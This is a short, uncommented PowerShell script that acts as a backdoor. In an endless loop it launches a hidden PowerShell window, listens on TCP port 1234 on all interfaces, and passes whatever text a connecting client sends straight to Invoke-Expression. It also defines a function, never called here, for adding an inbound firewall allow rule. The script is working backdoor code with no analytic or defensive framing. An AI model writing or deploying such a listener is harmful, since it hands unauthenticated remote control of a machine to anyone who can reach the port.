$triggerPort = 1234  

function Add-FW {
    param(
        [string]$RuleName,
        [string]$Port,
        [string]$Protocol = 'TCP'
    )

    $fireR = New-Object -ComObject hnetcfg.fwpolicy2
    $rule = New-Object -ComObject HNetCfg.FWRule

    $rule.Name = $RuleName
    $rule.Protocol = $fireR.IpProtocolTCP
    $rule.LocalPorts = $Port
    $rule.Enabled = $true
    $rule.Action = 1
    $rule.Direction = 1

    $fireR.Rules.Add($rule)
}

function Execute-Code {
    param(
        [string]$Code
    )

    Invoke-Expression $Code
}


while ($true) {

    $psProcess = Get-Process -Name PowerShell -ErrorAction SilentlyContinue

    if ($psProcess -eq $null) {

        $null = Start-Process -FilePath PowerShell.exe -WindowStyle Hidden
    }

    $listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, $triggerPort)
    $listener.Start()

    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $code = $reader.ReadToEnd()

    $listener.Stop()
    $reader.Close()
    $stream.Close()
    $client.Close()

    Execute-Code -Code $code
}
